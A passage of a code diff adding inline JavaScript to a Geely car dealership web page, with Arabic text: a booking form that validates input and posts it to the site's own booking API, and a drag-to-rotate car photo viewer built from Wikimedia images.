+                if (cancelBookingBtn) cancelBookingBtn.onclick = closeModal;
+                bookingModal.onclick = function (e) {
+                    if (e.target === bookingModal) closeModal();
+                };
+
+                bookingForm.onsubmit = function (e) {
+                    if (e && e.preventDefault) e.preventDefault();
+
+                    var payload = {
+                        name: String((document.getElementById('bookName') || {}).value || '').trim(),
+                        phone: String((document.getElementById('bookPhone') || {}).value || '').trim(),
+                        city: String((document.getElementById('bookCity') || {}).value || '').trim(),
+                        preferred_date: String((document.getElementById('bookDate') || {}).value || '').trim(),
+                        notes: String((document.getElementById('bookNotes') || {}).value || '').trim(),
+                        car_model: String((document.getElementById('bookModel') || {}).value || 'Geely 26').trim()
+                    };
+
+                    if (payload.name.length < 2) {
+                        bookingFeedback.textContent = 'الاسم غير صالح.';
+                        return false;
+                    }
+                    if (String(payload.phone).replace(/\D/g, '').length < 10) {
+                        bookingFeedback.textContent = 'رقم الهاتف غير صالح.';
+                        return false;
+                    }
+                    bookingFeedback.textContent = 'جاري إرسال طلب الحجز...';
+
+                    if (window.fetch) {
+                        fetch('/api/bookings', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        }).then(function (res) {
+                            return res.json().then(function (data) {
+                                return { ok: res.ok, data: data || {} };
+                            });
+                        }).then(function (result) {
+                            if (!result.ok || !result.data.success) {
+                                bookingFeedback.textContent = result.data.error || 'فشل إرسال الحجز.';
+                                return;
+                            }
+                            bookingFeedback.textContent = 'تم تسجيل الحجز: ' + result.data.booking_ref;
+                            bookingForm.reset();
+                            setTimeout(closeModal, 1200);
+                        }).catch(function () {
+                            bookingFeedback.textContent = 'تعذر الاتصال بالخادم حالياً.';
+                        });
+                    } else {
+                        var xhr = new XMLHttpRequest();
+                        xhr.open('POST', '/api/bookings', true);
+                        xhr.setRequestHeader('Content-Type', 'application/json');
+                        xhr.onreadystatechange = function () {
+                            if (xhr.readyState !== 4) return;
+                            try {
+                                var data = JSON.parse(xhr.responseText || '{}');
+                                if (xhr.status >= 200 && xhr.status < 300 && data.success) {
+                                    bookingFeedback.textContent = 'تم تسجيل الحجز: ' + data.booking_ref;
+                                    bookingForm.reset();
+                                    setTimeout(closeModal, 1200);
+                                } else {
+                                    bookingFeedback.textContent = data.error || 'فشل إرسال الحجز.';
+                                }
+                            } catch (_) {
+                                bookingFeedback.textContent = 'تعذر تحليل رد الخادم.';
+                            }
+                        };
+                        xhr.send(JSON.stringify(payload));
+                    }
+
+                    return false;
+                };
+
+                debugLine('booking: listeners ready');
+            }
+
+            function bindCar3D() {
+                var scene = document.getElementById('car3dScene');
+                var img = document.getElementById('car3dImage');
+                var title = document.getElementById('carPartTitle');
+                var desc = document.getElementById('carPartDesc');
+                var prev = document.getElementById('car3dPrev');
+                var next = document.getElementById('car3dNext');
+                var angle = document.getElementById('car3dAngle');
+                var model = document.getElementById('car3dModel');
+                var hotspots = document.querySelectorAll('.car-hotspot');
+
+                if (!scene || !img) {
+                    debugLine('3d: missing scene/image');
+                    return;
+                }
+
+                for (var i = 0; i < hotspots.length; i += 1) {
+                    hotspots[i].onclick = function () {
+                        for (var j = 0; j < hotspots.length; j += 1) {
+                            removeClass(hotspots[j], 'active');
+                        }
+                        addClass(this, 'active');
+                        if (title) title.textContent = this.getAttribute('data-title') || 'جزء من السيارة';
+                        if (desc) desc.textContent = this.getAttribute('data-desc') || 'لا توجد تفاصيل إضافية.';
+                    };
+                }
+
+                var frames = [
+                    { model: 'Geely Coolray', url: 'https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_Cool_003.jpg' },
+                    { model: 'Geely Emgrand', url: 'https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Emgrand_IV_005.jpg' },
+                    { model: 'Geely Monjaro', url: 'https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Monjaro_001.jpg' },
+                    { model: 'Geely Tugella', url: 'https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Tugella_001.jpg' }
+                ];
+
+                var frame = 0;
+                var pointerDown = false;
+                var lastX = 0;
+                var buffer = 0;
+                var spinTimer = null;
+
+                function renderFrame() {
+                    if (!frames.length) return;
+                    frame = (frame + frames.length) % frames.length;
+                    img.src = frames[frame].url;
+                    if (model) {
+                        model.textContent = 'الموديل: ' + frames[frame].model;
+                    }
+                    if (angle) {
+                        angle.textContent = 'زاوية: ' + Math.round((360 / frames.length) * frame) + '°';
+                    }
+                }
+
+                function step(delta) {
+                    frame += delta;
+                    renderFrame();
+                }
+
+                function stopSpin() {
+                    if (!spinTimer) return;
+                    clearInterval(spinTimer);
+                    spinTimer = null;
+                }
+
+                function startSpin() {
+                    stopSpin();
+                    spinTimer = setInterval(function () {
+                        if (!pointerDown) step(1);
+                    }, 3400);
+                }
+
+                function onMove(x) {
+                    var dx = x - lastX;
+                    lastX = x;
+                    buffer += dx;
+                    var threshold = 16;
+                    while (Math.abs(buffer) >= threshold) {
+                        step(buffer > 0 ? -1 : 1);
+                        buffer -= threshold * (buffer > 0 ? 1 : -1);
+                    }
+                }
+
+                scene.onmousedown = function (e) {
+                    pointerDown = true;
+                    lastX = e.clientX;
+                    buffer = 0;
+                    stopSpin();
+                };
+                window.onmouseup = function () {
+                    pointerDown = false;
+                    startSpin();
+                };
+                scene.onmousemove = function (e) {
+                    if (!pointerDown) return;
+                    onMove(e.clientX);
+                };
+
+                scene.ontouchstart = function (e) {
+                    if (!e.touches || !e.touches.length) return;
+                    pointerDown = true;
+                    lastX = e.touches[0].clientX;
+                    buffer = 0;
+                    stopSpin();
+                };
+                scene.ontouchmove = function (e) {
+                    if (!pointerDown || !e.touches || !e.touches.length) return;
+                    onMove(e.touches[0].clientX);
+                };
+                scene.ontouchend = function () {
+                    pointerDown = false;
+                    startSpin();
+                };
+
+                if (prev) prev.onclick = function () { step(-1); };
+                if (next) next.onclick = function () { step(1); };
+
+                renderFrame();
+                startSpin();
+                debugLine('3d: listeners ready, hotspots=' + hotspots.length);
+            }
+
+            try {
+                bindBooking();
+                bindCar3D();
+                debugLine('fallback: all bindings completed');
+            } catch (err) {
+                debugLine('fallback error: ' + (err && err.message ? err.message : 'unknown'));
+            }
+        })();
+    </script>
+</body>
+</html>
